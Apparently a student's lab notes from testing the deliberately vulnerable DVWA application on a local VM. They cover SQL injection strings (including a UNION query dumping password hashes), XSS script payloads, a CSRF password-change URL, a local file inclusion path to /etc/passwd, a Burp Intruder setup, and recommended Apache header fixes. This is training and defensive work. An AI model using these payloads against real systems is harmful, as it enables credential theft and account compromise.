# Task 3 — Technical Findings & Raw Notes

## SQL Injection
- Low: `' OR '1'='1` → returns all 5 users
- Low: `' UNION SELECT user, password FROM users -- -` → extracts hashes:
admin / smithy : 5f4dcc3b5aa765d61d8327deb882cf99 (= "password")
gordonb : e99a18c428cb38d5f260853678922e03
1337 : 8d3533d75ae2c3966d7e0d4fcc69216b
pablo : 0d107d09f5bbe40cade3de5c71e9e9b7

- High: blocks string payloads via `stripslashes()`, `mysql_real_escape_string()`,
  `is_numeric()` — escaping, not parameterized queries.

## Stored XSS
Payload: `<script>alert('Stored XSS')</script>` in guestbook Message field.
Persists across reloads — confirmed stored, not reflected.

## Reflected XSS
Payload: `<script>alert('Reflected XSS')</script>` in Name field.
Visible in URL: `?name=<script>alert('Reflected XSS')</script>`

## CSRF
Vulnerable URL (no token required):
http://192.168.56.102/dvwa/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change#

High security mitigation: re-checks `password_current` — not a CSRF token.
Password reset to original ("password") after testing.

## File Inclusion
LFI: `?page=../../../../../../etc/passwd` → full /etc/passwd returned
RFI: `?page=http://example.com` → blocked, server returns:
"URL file-access is disabled in the server configuration"
(confirms `allow_url_include=Off`)

## Burp Suite
- Intercepted POST /dvwa/login.php, edited `username` to `admintest`, forwarded.
- Sent to Intruder, marked `username` and `password` as payload positions
  (Sniper attack type, positions only — attack not launched).

## Security Headers (curl -I http://192.168.56.102/dvwa/)
HTTP/1.1 302 Found
Server: Apache/2.2.8 (Ubuntu) DAV/2
X-Powered-By: PHP/5.2.4-2ubuntu5.10
Set-Cookie: PHPSESSID=...; security=high
Location: login.php
Content-Type: text/html

Missing: X-Frame-Options, Content-Security-Policy, X-Content-Type-Options,
Strict-Transport-Security

Recommended fix (Apache httpd.conf):
Header set X-Frame-Options "SAMEORIGIN"
Header set Content-Security-Policy "default-src 'self'"
Header set X-Content-Type-Options "nosniff"
Header set Strict-Transport-Security "max-age=31536000; includeSubDomains"
